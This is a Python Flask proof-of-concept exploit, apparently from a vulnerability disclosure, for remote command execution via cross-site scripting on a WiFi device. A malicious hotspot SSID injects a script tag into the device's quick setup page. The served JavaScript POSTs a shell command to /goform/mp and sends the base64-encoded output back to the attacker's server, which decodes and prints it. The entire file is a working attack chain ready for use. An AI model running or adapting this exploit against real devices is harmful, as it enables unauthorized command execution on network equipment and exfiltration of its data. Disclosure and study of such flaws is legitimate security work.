from flask import Flask
import logging
import sys
from flask import request
import base64

# For more information about the variables and routes
# see poc-fetch-device-information.py

app = Flask(__name__)

# Disable logging
log = logging.getLogger("werkzeug")
log.setLevel(logging.ERROR)
cli = sys.modules['flask.cli']
cli.show_server_banner = lambda *x: None

command = "id"

xss_payload = """
window.onload = function() {
	fetch("/goform/mp", {
        "body": "command="""+command+"""&getID=",
        "method": "POST",
    }).then(response => response.text()).then(data => {
        fetch("//localhost/response?data=" + btoa(data))
    });
}
"""

print("")
print("[+] PoC RCE via XSS")
print("[+] Create a hotspot with the following SSID: <script src=//localhost>")
print("[+] Visit the quick setup site on the device and refresh the WiFi list")
print("")

@app.route("/")
def get_xss():
    print("[*] Sending XSS payload..")
    return xss_payload

@app.route("/response")
def get_data():
    data = request.args.get("data").replace(" ", "+")
    # Not the best decoding, but it works for a poc
    decoded_data = base64.b64decode(data).decode().split("</font><br>")[1].split("<br>\n\n</body>")[0].replace("&nbsp;", " ").replace("<br>", "")
    print(f"[+] Command '{command}': {decoded_data}")
    return ""

app.run("0.0.0.0", port=80)